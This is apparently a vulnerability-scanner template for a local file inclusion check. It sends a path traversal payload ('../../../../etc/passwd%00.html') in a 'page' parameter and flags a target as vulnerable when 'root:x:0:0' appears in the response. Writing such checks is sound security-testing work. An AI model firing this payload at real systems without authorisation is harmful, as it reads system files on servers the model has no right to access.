id: lfi2-043
name: 'Path traversal2 via page'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via page'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - '../../../../etc/passwd%00.html'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
